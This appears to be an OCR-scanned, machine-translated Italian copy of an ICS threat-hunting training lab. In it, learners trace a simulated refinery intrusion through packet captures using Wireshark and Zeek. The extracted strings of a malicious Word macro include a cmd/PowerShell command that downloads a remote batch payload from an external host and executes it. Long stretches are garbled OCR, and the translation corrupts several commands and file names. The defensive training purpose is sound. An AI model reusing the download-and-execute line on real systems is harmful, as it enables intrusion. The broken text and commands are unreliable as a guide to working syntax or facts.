Ultima modifica: venerdì 10 luglio 2020 21:19:16 GMT

*Risposta* L'indirizzo IP è 192.41.148.220 e il dominio è rckwel(punto)ru in comunicazione con 10.10.0.10

2. Qual è il nome del file che potrebbe essere dannoso? Curriculum vitae.doc

*Nota* Con la finestra Segui flusso TCP ancora aperta dall'ultima domanda possiamo vedere che c'è anche a
File curriculum.doc che è stato trasferito al sistema nella nostra rete. Questo è sospetto nel contesto, ma lo faremo
vogliamo saperne di più prima di dire che probabilmente è dannoso. Potremmo ritagliare il file e analizzarlo ma
tutto ciò di cui abbiamo bisogno potrebbe essere anche qui, nel traffico.

© 2021, Robert M. Lee Lab 3.1-4

@) (@

)

‘> re e e ® (= ®) (=)

cioè
ww a

"5"

15 G!

45

OTTIENI /Riprendi.doc
Accetta: testo/html,
Referente: http://rckwel.ru/
Accetta lingua: en-US
Agente utente: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) come Gecko
Codifica accettata: gzip, deflate

Ospite: rckwel.ru

Connessione: Keep-Alive

n/xhtml+xml, */*

HTTD/41 A PAA NK

3. Di quale comune utilità Windows si abusa nel documento? powershell

> Continua a rivedere il flusso TCP
> Identificare i caratteri ASCII leggibili che possono essere facilmente osservati

*Nota* Troverai del testo interessante nella parte inferiore della finestra.

sie il ]...&. {9BA95972-F6A8-11CF-

Aaa2-QGAGC9OABF39} . X. cmq. exe. /e Honsohartre IWR -uri “https://
raw.githubusercontent . cany redébnaryoovatoalie red- team/master/ARTifacts/Chain. _Reazioni/chain_reaction_DragonsTail.bat" -
OutFile epee beentea ay OAi: bat" ; ~\Document s\payload. bat... C:\Windows \System32. .

sito st BRR. Res y ive Peet Ree ere reer hr tos . PW Bi soggezione \rootesccs
\cimv2. .$.6. ..Avvio.. +H. -@. .H.C.L + -winmgmts: sta
EB saaics te \root .Process. '$s. 6. 'oma. exe cioè "powershell. exe TEX. ( “IWR suri HU a di

raw.githubusercontent. con/reicanaryoo/atoni red-team/master/ARTifacts/Chain \_Reactions/chain_reaction_DragonsTail.psi').

oH, [eRe oN BOP i ss ccae'c Densecersecsven Ororsveccecreces Vedi ree AG@O..... ABP... ss AGO..... ABP cae =>
Banee wae pa age Attribut.e VB_Nam.e = nad. ulei”

S.ub Aa bagabecior eatetchiCinaaoiee: -Pr.v4()
+-Const .ShellwinPdows.._.6".{9BAQ597 .2-F6A8-1.1CF-A442. -Q@AOC90 .ASF39}.v.1.Se.GW.=Get .Object(".new:" &

_@). Elemento, .S.W.Docume.nt.Appli.cation,...Exec,."cm.d.exe", ."/c powe.rs.Y.
IWR. -uri “".https://.raw.gith.ubuserco.nt./com/r.edcanary.co/atomi.c-. -team./master/.ARTifact.s/Chain_.Re...Is /
e.....0.0 Dran...Tail ba.t®" -Out File F~\.k.s\navina?d. .:

*Nota* C'è molto interesse da esplorare qui, ma il più interessante è il file powershell.exe e il file
File Dragonstail.bat. Queste sono le stringhe di strumenti e comandi presenti nel documento word così com'è
veniva trasferito attraverso la rete. Powershell è un'utilità Windows nativa comunemente abusata fornita
da numerosi attori statali e criminali. Ci aiuta a capire che Resume.doc è dannoso e si sta muovendo
file nella rete che sono comuni agli avversari che tentano di ottenere credenziali elevate e spostarsi
il network.

4. Quali sono altri due file potenzialmente dannosi che contribuiscono a dimostrare che si tratta di un'intrusione di Fase 1?

cip_plc_information.exe

cip hmi_emulator.exe

> Cancella tutti i filtri aperti

*Nota* Poiché sappiamo che ci sono trasferimenti di file di interesse in corso nell'acquisizione dei pacchetti, possiamo controllare
se ci sono file che ti interessano.

© 2021, Robert M. Lee Lab 3.1-5
>

> Fare clic su HTTP...

*Nota* Ci sono molti file in questa acquisizione di pacchetti, il che non è raro nel traffico di rete. Tuttavia, molto
di esso è al dominio rckwel.ru, il che significa che molti di questi probabilmente meritano di essere compresi. Per prima cosa andiamo
cercare evidenti elementi di spicco. Ordinare i file facendo clic sulla colonna Nome file. Quando lo facciamo, vediamo un numero

Esporta oggetti HTTP
> Fare clic su File
> Passa il mouse sopra Esporta oggetti

Salva come...

Modifica Visualizza Vai Acquisisci Analizza Statistiche Telefonia Wir

Opel

Aperto di recente

Unisci...

Importa da dump esadecimale...
Vicino

Insieme di file

Esporta pacchetti specificati...

Esportare dissezioni di pacchetti
Esporta byte del pacchetto...
Esporta PDU su file...

Esporta chiavi di sessione TLS...

Esporta oggetti

Stampa...

_Esentato

Ctrl+o % Ko o¥l :

Destinazione
10.10.255.2
Ctrl+w | 224.0.0.252
| 224.0.0.252
| 224.0.0.252
Ctrl+Maiusc+S | 9594 6.0.252
»| 224.0.0.252
-} 224.0.0.252|
224.0.0.252
>| 224.0.0.252
. | 10.10.255.2
Ctrl+Maiusc+x | 49.19.255.2
4192.41.148.

CTRL+P | HTTP.
Ctrl+Q | FMI.
PMI.
|
| TTP.

10.10.6.10

DICOM...

di file interessanti incluso il file Resume.doc originale ma anche file a tema Rockwell come RSLINX.exe
e FTActivationBoost.exe

Pacchetto
85131
32853
37594
46461
20442
25920
50603
597
737

Nome host

rckwel.ru
rckweLru
rckweLru
rckwelru
rckwel.ru
rckweLru
rckwel.ru
rckwel.ru
1

+

Wireshark - Esporta - Elenco oggetti HTTP

Tipo di contenuto
testo/semplice

applicazione/x-msdos-p...
applicazione/x-msdos-p...
applicazione/x-msdos-p...
applicazione/x-msdos-p...
applicazione/x-msdos-p...
applicazione/x-msdos-p...

applicazione/parola chiave

Misurare
40 byte

5.134 kB
5.138KB
5.134 kB
5.137KB
5.135KB
5.135KB
265KB

applicazione/flusso di ottetti 64 byte

_ Nome file: : re

BootpServer.exe
ControlFLASH.exe
FTActivationBoost.exe

RADrvDBMgr.exe

beh

Questi file potrebbero essere applicazioni legittime o contenenti trojan. Quando fai clic su uno dei nomi di file, ci vorrà
al punto dell'acquisizione del pacchetto in cui si trova.

© 2021, Robert M. Lee

Laboratorio 3.1 -6

2,

=)

m™ oe > ® ®) e) () ®) (®) (®) (®) (eo) (@)

ii)
un eee

sì ww

rr a

oe ww Ww

<p'

> Fare clic su RSLINX.exe

85131 testo/semplice 40 byte

32853 rckwel.ru application/x-msdos-p... 5,134kB | BootpServer.exe
37594 rckwel.ru application/x-msdos-p... 5,138kB — ControlFLASH.exe
46461 rckwel.ru application/x-msdos-p... 5,134kB — FTActivationBoost.exe
20442 rckwelru application/x-msdos-p... 5,137kB = RAComSrv.exe

25920 rckwel.ru ... 5.135 kB

rckweLro

iApplica un filtro anti-disjay

oO. Sorgente temporale
50592 437, 199192 192.41.148,220
50593 437.190194 10.19.0.108
50594 437.190199 192.41.148.220

50595 437. 190200 10.10.0.190 597 eckweLru applicazione/msword 265 kB Resume.dd
50596 437.190209 192,41.148.220 737 rckwel.ru application/octet-stream 64 byte __utm.gif
50597 437.190214 192.41.148.220 748 rckwel.ru applicazione/flusso-ottetto 64byte __utm.gif
50598 437.190221 192.41.148.220 759 rckwel.ru applicazione/flusso-ottetto 64 byte __utm.gif
50599 437.190227 192.41.148.220 770 rckwel.ru applicazione/flusso-ottetto 64byte __utm.gif
50600 437.199234 192.41.148.220 781 rckwel.ru applicazione/flusso di ottetti 64byte __utm.gif
50601 437.190350 10.10.0.10 792 rckwel.ru applicazione/flusso di ottetti 64 byte __utm.gif
50602 437.190358 10.10.6.10 803 rckwel.ru applicazione/flusso di ottetti 64 byte __utm.gif
59603 437.191671 192-41.149; 220 813 rckwel.ru applicazione/flusso di ottetti 64 byte __utm.gif
50604 437. 191875 10.19.9.10 824 rckwel.ru applicazione/flusso di ottetti 64 byte __utm.gif
> Esamina il flusso del pacchetto selezionato
> Ridurre a icona la finestra dei file
> Fare clic con il tasto destro sul pacchetto selezionato
> Segui > Flusso TCP
> Esamina lo streaming
Iv.i0.0.19 I9Z. 41, 148.2209 CF UF DI9IS SU [ACK] Seq= |
192. 41.148.220 TcP 54 [Aggiornamento TCP visioni] 5
18 HTTP/1.0 260 OK (ca
un pacchetto CtrlemM 54 51553 ~- 80 [ACK] Seq=

Ignora/Non ignora il pacchetto Ctrl+D

Ethernet II, Src: Sarian_ 20:8) da set/Unset Time Reference ctrlat (f8:db:88:3c:53:04)

Protocollo Internet Ve

h : Spostamento temporale... Ctrl+shift+T it 2
Commento pacchetto... Ctrl+Alt+c 6475(1460) #46476(1460)
Edi L d Nome

Tipo edia

"Applica come filtro"

f8db

Prepara come filtro »
Filtro di conversazione
Colora la conversazione
SCTP

Vendita controllo TCP Stream!
ame (618 byte) | | TcP riassemblato (1352 ~ oe an seamccmm| TLE S a
Preferenze protocollo >| flusso uTTP Ctrleale!

7 _ itincident.pcap

Decodifica come... i

*Nota* Come abbiamo fatto in precedenza, cerca rapidamente tra i dati ASCII per identificare le sezioni leggibili dall'uomo e vedere se
c'è qualcosa di interessante.

© 2021, Robert M. Lee Lab 3.1-7
È). -UPhlb) o... dw, + )...urllib.error).r....i-w..i -urllib.parse).r....i.]..i-
2..)...urllib.request).r....if{...i.z..)..-urllib. risposta). REE 1 dere t pera pened TD Lg cura hy Were sano di mente Bert

browser web).r....i-.

Tk -)....xmL).7....i.Ts.d... xml.parsers).r....i.V.......)....xml.parsers.expat). r....vos) os oXML. SAX)... 1<X..
io. xml. sax._exceptions) wA..i....)...xml.sax.expatreader).r. Be gs Bee Sheen eek ndler).r....i>|..

o .xml,sax.saxutils).r. B. .xml.sax.xmlreader).r....i. -zipfile);r....i. 4

mpyimod@1_os_path.......
...H..mpyimod03_importers 4
.8 informazioni_scip_plc.

vedi eeneeee e.mstruct..
$} .mpyimod02_archive. .
©..3....L...0.spyiboote1_bootstrap

Po.

$ 8. bYCRUNTIME140.d11l... : B. )_bz2.pyd... )_ctypes.pyd......
‘ * “ b_lzma.pyd. *b_socket.pyd.
cip pic informa exe manifest....
1052} +..2 .b1Libss.
,..Z..bseleziona .pyd....... @..NH....

nome cip_plc_information.exe.manifest......-...-+-++++++
. Pipì 1S BE + 2PYZ-@8.pyz.

4 .xbase_library.zip.
oo eshe op Die te bu wwe 'python37.dll..

1 pacchetto client, 1 pacchetto server, 1 turno.
Intera conversazione (5.135 kB) * Mostra e salva i dati come ASCII bil

*Nota* Alla fine dei dati ci sono riferimenti a Python che difficilmente viene utilizzato dall'applicazione Rockwell
in un ambiente ICS. Inoltre, ci sono eseguibili all'interno dell'eseguibile incentrato su CIP, che è a
protocollo sfruttato da Rockwell e altri e PLC. Il file “cip_plc_information.exe" è qualcosa
segnaleremo per ulteriori analisi e ci aiuta anche a capire se l'avversario sta sfruttando questa capacità
è probabile che vedremo un'interazione diretta tramite CIP con i nostri PLC. Questa è molto probabilmente una funzionalità personalizzata dell'ICS e
non solo a tema ICS.

> Cancella i filtri esistenti e torna a File > Esporta > HTTP...
> Ripeti il ​​passaggio precedente per altri eseguibili come FTActivationBoost.exe

AW crea J. xml, Sax).F...-4AX.-
1.sax.handler).r....iC]..i
yO ES CL eee Oy semplice

Joxml). F.1d Ts sds sss )++ XML, parser).r...-i-Ve.--
xml.sax._exception) iA. .io

.xml.sax.saxutils).r....iM
oavians ae mee e€.mstruct.. 8
$}.mpyimod@2_archive..........5-
.L...0.spyiboot01_bootstrap ‘ . )_mit
$ 8. bVCRUNTIME140.d11... alee -b_bz2. .b_ctypes.pyd......

F - - _ssl.pyd... beip_hmi_emulator.exe.manifest
..!. .bliberypto-1_1.d11 con btacess« 2 .blibssl-1_1.dl1l... bpyexpat .pyd......
ah p..7...bpython37.dll. ...-@..bunicodedata.pyd.......6e.seeeeeeee ard
49 . opyi-windows -mat cs
@. .xbase_library.zip...
noi J ALJ... .. +. Sopython37.d1l
1 pacchetto client, 1 pacchetto server, 1 turno.
Intera conversazione (5.134 kB) Ns Mostra e salva i dati come ASCIl x

*Nota* Ancora una volta, identifichiamo alcuni eseguibili sospetti basati su CIP, in questo caso cip_hmi_emulator.exe. Questi
i file non sono immediatamente dannosi ma altamente sospetti in quanto eseguibili incorporati nel codice Python
ed entrambi gli eseguibili. A questo punto è sicuro e accurato presumere che si tratti di malware.

© 2021, Robert M. Lee Lab 3.1-8

(3) (3) oe awe @) a) ) (?) (®) @®) ®) ee @®

(3)

ao,

ehi,
l'ip è è

ip!

ip'

‘5!

e GS

Laboratorio 3.2 - Indagine sulle intrusioni di Fase 2 _

e Distinguere le intrusioni nella Fase 2 dalle Intrusioni nella Fase 1
e __ Sfrutta l'analisi del traffico per seguire le intrusioni
e Identificare gli artefatti e gli indicatori chiave delle intrusioni

*Informazioni sullo scenario* Avendo stabilito che il sistema Enterpise1 era compromesso e stava comunicando
su un server C2 il team ha deciso di passare rapidamente alla rete OT. Come membro del rilevamento delle minacce
team di cui hai bisogno per determinare se sono presenti sistemi compromessi nella rete OT e eventuali informazioni su di te
possiamo raccogliere informazioni nella raffineria di Calistoga per determinare se è necessario eseguire una risposta agli incidenti.

Questo esercizio utilizzerà la tua VM RELICS e il file otincident.pcap nella cartella ICS515 sul desktop del

1. Quale nuovo sistema sta comunicando con 192.41.148.220?

2. In che modo il sistema è stato probabilmente compromesso e ci sono altri sistemi probabilmente compromessi?

3. Qual è il nome del file di progetto dannoso?

4. Qual è la dimensione massima del file RSLINX.exe e qual è la dimensione del file Resume.doc?

5. Perché questa intrusione rientra nella Fase 2?

© 2021, Robert M. Lee Lab 3.2 -1
Compito: analizzare le comunicazioni della rete OT

1. Quale nuovo sistema sta comunicando con 192.41.148.220?
10.10.10.30

> Avvia la tua VM RELICS

> Accedi alla VM
> ACCEDI =reliquie
> PASSWORD = reliquie

> Naviga nel Terminale fino a ics515 > calistogarefinery > pcaps
> - Nel Terminale esegui il comando:
cd Desktop/ics515/calistogarefinery/pcaps/

€ cd Desktop/ics515/calistogarefinery/pcaps/

itincident.pcap normalops.pcap otincident.pcap

> Esegui Zeek sul file otincident.pcap
> Nel Terminale esegui il comando:
zeek -C -r otincidente.pcap

ent.pcap

*Nota* Questo legge il pcap rispetto allo strumento Zeek che poi lo analizza automaticamente in base al file
configurazione di Zeek. In questo caso non utilizziamo Zeek come sistema di rilevamento delle intrusioni ma come sistema
linguaggio di scripting di rete, produrrà automaticamente log, molto simili nel processo di pensiero a syslog
traffico di rete, che possiamo quindi esaminare per rispondere alle domande che abbiamo.

> Analizza le comunicazioni con 192.41.148.200
> Esegui il seguente comando nel Terminale
cat conn.log | zeek-cut id.orig_h id.resp_h | grep192.41.148.22 | ordinare | unig
> Determinare il nuovo indirizzo IP

$ cat conn.log | zeek-cut id.orig_h id.resp_h | grep192.41.148.22 | ordinare | unico
10.10.0.10 192.41.148.220

10.10.10.30 192.41.148.220
192.41.148.2268 10.10.16.36

© 2021, Robert M. Lee Lab 3.2 -2

@) (®) @) (@) @@) )

(®)
Ss

4

*Nota* Questo comando legge i registri di connessione e utilizza i registri ASCII Zeek per selezionare le informazioni
designare come indirizzi IP di origine e di risposta; quindi cerca l'indirizzo IP che volevamo trovare
anche le comunicazioni (192.41.148.22) e lo ordina visualizzando solo valori univoci. Questo è molto più veloce del setacciamento
tramite Wireshark.

*Answer™ Sapevamo già dell'indirizzo 10.10.0.10 ma non sapevamo dell'IP 10.10.10.30
indirizzo (basato sulla precedente comprensione del diagramma di rete).

2. In che modo il sistema è stato probabilmente compromesso e ci sono altri sistemi probabilmente compromessi?

RSLINX.exe e beacon.exe sono stati spostati
lateralmente dal sistema informatico

10.10.10.20

*Nota* Zeek crea automaticamente numerosi file di registro durante l'analisi del traffico di rete. Uno di questi file di registro è
files.log che estrae i vari file che attraversano il traffico di rete in modo simile alla funzione Export di Wireshark.> Analizza i file per vedere se è stato trasferito qualcosa a 10.10.10.30
> Esegui il seguente comando nel Terminale

file cat.log | zeek-cut tx ospita rx_hosts nome file sorgente | grep
10.10.10.30

file cat.log | zeek-cut tx_hosts rx_hosts nome file sorgente | grep 10.10.10.30
192.41.

\\Amministratore\\b
\\Amministratore\ \b

*Risposta* Qui vediamo che 10.10.0.10 (sistema IT) sta trasferendo file a 10.10.10.30 (sistema OT) tramite SMB e
che ci sono una serie di file interessanti come RSLINX.exe e beacon.exe. Tutto questo probabilmente rappresenta un lato
movimento.

*Nota* Sapendo che 10.10.0.10 sta eseguendo il movimento laterale possiamo vedere se ci sono altri sistemi
che solo 10.10.10.30 infetto eseguendo lo stesso comando di prima ma spostandosi fuori dall'infrastruttura
l'avversario sta utilizzando l'interno della nostra rete (.10).

© 2021, Robert M. Lee Lab 3.2 -3
> Analizza altri file trasferiti da 10.10.0.10
> Esegui il seguente comando nel Terminale
file cat.log | zeek-cut tx_hosts rx_hosts nome file sorgente | grep
10.10.0.10

Amministrazione\\Desktop\\condivisione\\flexsvr.exe
Amministrazione\\Desktop\\condivisione\\flexsvr.exe: zona. Identificatore
Amministrazione\\Desktop\\condivisione\\FTActivationBoost.exe
Amministrazione\\Desktop\\condivisione\\FTActivationBoost.exe
Admin\\Desktop\\share\\FTActivationRoost.exe:Zone.id
Amministrazione\\Desktop\\condividi\\nxlog-ce-2.10.2150.msi
Amministrazione\\Desktop\\condividi\\nxlog-ce-2.10.2150.msi
Amministrazione\\Desktop\\condividi\\nxlog-ce 10.2150.msi:Zone.I
Amministrazione\\Desktop\\condivisione\\RAComSrv.exe
Amministrazione\\Desktop\\condivisione\\RACo v.exe
Amministrazione\\Desktop\\condivisione\\RAComSrv.exe: zona. Identificatore
Amministrazione\\Desktop\\condivisione\\RAComSrv.exe
Amministrazione\\Desktop\\condivisione\\radmin.exe
Amministrazione\\Desktop\\condivisione\\radmin.exe
Ammin\\Desktop\\condivisione\\radmin.
Amministrazione\\Desktop\\condivisione\\vDBMgr
Amministrazione\\Desktop\\condivisione\ rvDBMgr .e
Admin\\Desktop\\condivisione\\RADrvDBMgr .ex ne.Identi
Amministrazione\\Desktop\\condividi\\

Ammin\\D: op\\condividi\\R

Amministrazione\\Desktop\\condividi\\R
Amministrazione\\Desktop\\condividi\\Resume (1).doc:Zo Identifie
Amministrazione\\Desktop\\condividi\\Riprendi (
Ammin\\Desktop\\condividi\\Re
Amministrazione\\Desktop\\condividi\\Riprendi. :Zona. Identificatore
Ammin\\De p\\condividi\\RSLINX
Amministrazione\\Desktop\\condividi\\RSLINX.

*Risposta* È chiaro che gli stessi file dannosi e alcuni altri come flexsvr.exe vengono trasferiti su
10.10.10.20 un altro dispositivo ICS.

3. Qual è il nome del file di progetto dannoso?

BurnerManagementinfetto.ACD

*Nota* Possiamo esaminare tutto, ma concentriamoci sulle comunicazioni delle PMI poiché di solito se ne abusa
per il movimento laterale.

> Analizzare i file trasferiti tramite SMB al 10.10.10.30
> Esegui il seguente comando nel Terminale
cat file smb.log | zeek-cut id.orig_h id.resp_h nome | grep
10.10.10.30

© 2021, Robert M. Lee Lab 3.2-4

eo ra) = jf cm

UN]

o

io]
ip

'S

7 e.e

<B

4s ae come «s come come «Ss come

“,

COME

S$ cat smb_files.log | zeek-cut id.orig_h id.resp_h nome | grep 10.10.10.30
3 \\srvsve

\\wkssve

\\srvsve

\\wkssvc

\\srvsve

B.0

\\Amministratore\\Desktop\\condividi\\RSLINX. exe

\\Pubblico\\desktop.int
\\Amministratore\\Desktop\\BurnerManagementInfected.ACD
\\Amministratore\\Desktop\\BurnerManagementInfected.L5K

*Risposta* Avresti potuto vederlo anche nell'altro comando, ma sapendo che i file erano in corso
trasferito tramite SMB, questo era il modo più semplice/pulito per ottenere la risposta. IL
I file .ACD e .L5K infetti da BurnerManagement sono quelli che vogliamo; ne registreremo uno allo scopo di
risposta, ma entrambi sarebbero giusti e vorremmo estrarli entrambi per analizzarli in seguito.

4. Qual è la dimensione massima del file RSLINX.exe e quale è la dimensione del file Regume.doc?
265728 byte___

5135056 byte

> Determina la dimensione dei file utilizzando Zeek
> Esegui il seguente comando nel Terminale
file cat.log | zeek-cut nome file byte totali | grep Curriculum vitae.doc
> Registra la risposta
Esegui il seguente comando nel Terminale
file cat.log | nome file zeek-cut total_bytes | grepRSLINX.exe
> Registra la risposta

file cat.log | nome file zeek-cut total_bytes | grep Curriculum vitae.doc
dmin\\Desktop\\condividi\\ 265728
dmin\\Desktop\\condividi\\ :Zona. Identificatore

file cat.log | nome file zeek-cut total_bytes | grepRSLINX.exe
\Amministratore\\Desktop\\condividi\\ 5135056
\Admin\\Desktop\\share\\ :Zone.Identifier:
Kdmin\\Desktop\\condividi\\ 5135056
admin\\Desktop\\condividi\\ 5135056
dmin\\Desktop\\condividi\\ :Zona. Identificatore

*Risposta* RSLINX.exe è di circa 5.135.056 byte e Resume.doc è di circa 265.728 byte. Si traduce anche come
rispettivamente 5.138 kB e 265 kB.

© 2021, Robert M. Lee Lab 3.2-5
5. Perché questa intrusione rientra nella Fase 2? Domanda a risposta a perta

L'intrusione è chiaramente focalizzata sulla porzione ICS della rete. L'intrusione nell'Azienda si qualifica come a
Intrusione di fase 1 perché c'era un obiettivo dimostrabile da parte dell'avversario di entrare nelle reti ICS, e non solo
prendere di mira le reti aziendali che sono un'azienda industriale.L'intrusione è proseguita
accedere alla Engineering Workstation nell'ICS e non si tratta di un'infezione accidentale; è chiaro con il
I file a tema Rockwell e il posizionamento sulla Engineering Workstation in cui si trova l'avversario
Sviluppa la fase 2 della Cyber ​​Kill Chain di ICS oppure sono già pronti per l'attacco
(potenzialmente significa che hanno avuto accesso in precedenza all'ambiente per lo sviluppo di capacità,
questo però non è certo).

© 2021, Robert M. Lee Lab 3.2 -6

eo

a ae a, @ @) @ @ @ @

)

UN @ @

buongiorno, @

UN @
vn a

era cioè

È!

È

~~ — __ 7» ed “7 “s “Bp iB’

==

_Lab 3.3 — Analisi del traffico della manipolazione del controllo

e Sfruttare l'analisi del traffico per facilitare l'analisi delle cause profonde
e Identificare la manipolazione del controllo attraverso l'analisi del protocollo

*Informazioni sullo scenario* La rete OT è decisamente compromessa e stiamo attivando la risposta all'incidente
squadra è importante fare quante più analisi possibili per supportare l’indagine. A questo punto siamo iper
preoccupato per le comunicazioni ai controllori e ai sistemi che gestiscono il sistema di sicurezza e ne hanno bisogno
per determinare se sono in corso manipolazioni o modifiche.

Preparazione agli esercizi

Questo esercizio utilizzerà la tua VM RELICS e il file otincident.pcap nella cartella ics515 sul desktop del
VM.

1. Qual è la prima tattica che l'avversario mette in atto contro il PLC?

2. Quali porte ha aperte il PLC?

3. Qual è lo strumento utilizzato per interagire con il PLC?

4. Qual è la causa principale dell'impatto sulla struttura?

5. Quando il PLC va offline e perché è probabile che venga ancora visualizzato in rete?

© 2021, Robert M. Lee Lab 3.3-1
Compito — Analisi del traffico;

1.

*Nota* Con la Engineering Workstation chiaramente compromessa a questo punto è fondamentale identificare il

Qual è la prima tattica che l'avversario mette in atto contro il PLC?
Scansione

> Avvia la tua VM RELICS

> Accedi alla VM
> ACCEDI=xreliquie
> PASSWORD = reliquie

> Apri otincide.pcap in Wireshark
> Aprire la cartella ICS515 situata sul desktop e quindi accedere a calistogarefinery > pcaps
> Fare doppio clic su otincident.pcap per aprire il file in Wireshark

> Analizzare le comunicazioni da e verso il PLC 10.10.20.10
Crea un filtro in Wireshark per ip.addr==10.10.20.10
Seleziona Statistiche > Conversazioni

Limita al filtro di visualizzazione

Passare alla scheda TCP

Revisione per qualsiasi cosa anormale

VVVVV

impatto potenziale. Le workstation di ingegneria hanno un ruolo importante nella programmazione della logica dei PLC. Noi
sappiamo dall'inventario e dalla topologia delle risorse che 10.10.20.10 è uno dei Rockwell ControlLogix della struttura

PLC e che svolge il ruolo di PLC di sicurezza per il sistema di gestione del bruciatore. È importante vedere se

si sta svolgendo qualsiasi attività dannosa. In alcune strutture una postazione di lavoro di ingegneria non avrà coerenza
comunicazioni al PLC, comunicando solo quando vengono apportate modifiche, in alcune strutture però
potrebbero esserci comunicazioni coerenti. Quindi dati storici, che non abbiamo in questo scenario, per questo
sarebbe molto importante per diagnosticarlo rapidamente. Per noi dovremo lavorare con quello che abbiamo.

File Modifica Visualizza Vai Acquisisci Analizza Statistiche Telefonia Strumenti wireless Guida

40640 MR ROVERE OVALE

io è) Wy

(W]ip.addr==10.10.20.10

N. Ora 2 Sorgente - _ Destinazione ace a Protocollo Li
| 1293..1752.394388 10.10.20.10 ~~ 40.10.10.30 TCP
| 1293... 1752.399433 10.10.20.10 10.10.10.30 cIP
| 1293... 1752.578633 10.10.10.30 10.10.20.10 TCP
A902 414759 7ADOAA 18 416 49 26) Af 40 9 46 Js Pa
© 2021, Robert M. Lee Lab 3.3-2

(2)

“beh

piano cottura)
UN

Ty

Cp “a

'UN

Cattura le proprietà del file

Indirizzi risolti
Gerarchia dei protocolli
Conversazioni

18:..28 1

10.20.1 Endpoint
10.10. Lunghezze dei pacchetti
10.10.3'

10.20.1; /OGrafico

10.20. 1 Tempo di risposta del servizio

Wireshark - Conversazione}

Ethernet-3 IPv4-3 IPv6 | TCP-86 | UDP-4

IndirizzoA * PortaA IndirizzoB PortaB _—Pacchetti ~— Byte _~—— Pacchetti A>B Byte A>B
10.10.10.20 54741 10.10.20.10 44818 35.607 3.970k 17.635 2,00
10.10.20.20 57617 10.10.20.10 21 4 252 2 1
10.10.20.20 57620 10.10.20.10 22 4 252 2 |
10.10.10.20 $7623 10.10.20.10 23 4 252 2

70.10.10.20 57625 10.10.20.10 25 4 252 anni }

| 10.10.10.20 57628 10.10.20.10 80 14 820 8

10.10.20.20 57630 10.10.20.10 135 4 252 2

10.10.20.20 57632 10.10.20.10 139 4 252 2

10.10.20.20 57634 10.10.20.10 443 4 252 2

10.10.10.20 $7636 10.10.20.10 445 4 252 2

*Nota* Le comunicazioni tra un PLC e il relativo software di controllo sono spesso abbastanza prevedibili. Non è giusto
dicono che sono coerenti e che vale la pena indagare su qualsiasi anomalia, non sono comunicazioni statiche come
la gente vorrebbe crederci a volte. Ma generalmente sono coerenti. Qui vediamo che ci sono i TCP
comunicazioni sulla porta 44818 per EthernetIP/CIP che ci aspetteremmo. Ma ci sono anche molti altri porti
accesso effettuato dal 10.10.10.20 (Factory Talk View HMI) con 4 pacchetti ciascuno. Una revisione di chi invia cosa
rivelare che 10.10.10.20 sta inviando 2 pacchetti a 10.10.20.10 (PLC di sicurezza) ciascuno a 132 byte che sta rispondendo
con 2 pacchetti ogni volta da 120 byte. Questo è molto caratteristico dell'attività di scansione.

> Analizzare la potenziale attività di scansione
Seleziona una delle potenziali scansioni
Fare clic con il tasto destro

Applica come filtro > Selezionato > A<->B
Riduci a icona la finestra Conversazioni
Esamina il traffico

VVVVV

© 2021, Robert M. Lee Lab 3.3-3
~ Informazioni sulla lunghezza del protocollo
FCP. 66 $7638 + 185 [SYN] Seq=9 Win-8192 Len=<
' ho dato un colpetto a W

Destinazione

*Nota* Sta chiaramente scansionando il punto in cui il 10.10.10.20 invia una richiesta SYN a una porta il 10.10.20.10 che è chiusa
quindi risponde con un pacchetto RST, ACK.

*Rispondi* Scansione

2. Quali porte ha aperte il PLC? 44818

80

> Rivedi nuovamente le conversazioni del 10.10.20.10
Applica il filtro ip.addr==10.10.20.10
Passare a Statistiche > Conversazioni
Seleziona la scheda TCP

Ordina in base alla colonna Pacchetti

Esaminare i risultati

VVVVWV

Wireshark - Conversazioni

Ethernet-3 IPv4-3 IPv6 TCP-86 | UDP-4
Indirizzo A Porta A Indirizzo B Porta B Pacchetti * Byte Pacchetti A>B Byte A>B
10.10.20.20 54741 10.10.20.10 44818 35.607 3.970k 17.635 2.000
10.10.20.10 44818 10.10.10.30 1746 25.615 4.412k 12.886 2,42
10.10.20.10 44818 10.10.10.30 1511 25.051 5.621k 12.567 2.831
10.10.10.20 64672 10.10.20.10 44818 117 30k 57 6,5
10.10.20.10 44818 10.10.10.30 1746 31 4,839 15 2,5
10.10.10.20 59845 10.10.20.10 44818 19 1.790 10 od
10.10.10.20 59273 10.10.20.10 44818 19 1.790 10 9
10.10.10.20 51472 10.10.20.10 44818 17 1.589 9 8
10.10.10.20 57628 10.10.20.10 80 14 820 8 a
10.10.10.20 57811 10.10.20.10 44818 12 71Z 6 3
10.10.10.20 51394 10.10.20.10 44818 11 805 6 4
10.10.20.20 58436 10.10.20.10 44818 11 856 6

10.10.10.20 51393 10.10.20.10 44818 9 598 5 3
10.10.20.20 57617 10.10.20.10 21 4 252 2 1
10.10.20.20 57620 10.10.20.10 22 4 252 2 1
10.10.10.20 57623 10.10.20.10 23 a 252 Zz 1
10.10.10.20 57625 10.10.20.10 25 ct 252 2 1

*Nota* Vediamo che il 10.10.20.10 ha le porte TCP 44818 e 80 aperte. Altre porte come la porta TCP 21, 22,
23 e 25 hanno solo 4 pacchetti che erano il SYN seguito da RST, il modello ACK che abbiamo visto in precedenza indicando
è chiuso.

© 2021, Robert M. Lee Lab 3.3 -4

(B)
OH

UN

CU Tt ​​|

*Rispondi* Porta TCP 44818 e porta TCP 80
3. Qual è lo strumento utilizzato per interagire con il PLC? pycomm

*Nota* In base ai laboratori precedenti sappiamo che la versione 10.10.10.30 è stata compromessa e che è stato
trasferitogli dall'avversario. Un punto di partenza naturale per determinare cosa è successo subito prima del
le comunicazioni avvenivano tra il 10.10.30 e il 10.10.2010 soprattutto se c'era una logica
manipolazione.

> Rivedere le comunicazioni tra il 10.10.10.30 e il 10.10.20.10
> Applica il filtro ip.addr==10.10.10.30 && ip.addr==10.10.20.10
> Fare clic sul primo pacchetto
> Fare clic con il tasto destro e seguire > Flusso TCP

io  ------
File Modifica Visualizza Vai Acquisisci Analizza Statistiche Telefonia Strumenti wireless Guida
A464@m@ RGOQAK VHA.

& indirizzo.lip==10.10.10.30 && indirizzo ip==10.10.20.10

Nessun tempo ~ Protocollo di destinazione
1 9.000000 10.10.19.30 10.10.20.19 cIP
2 8.001201 10.10.20.10 10.10.10.30 TCP
3 0.004695 10.10.20.10 10.10.10.30 CIP
4 0.163838 10.10.10.30 10.10.20.10TCP
33 0.494983 10.10.10.30 10.10.20.10 CIP
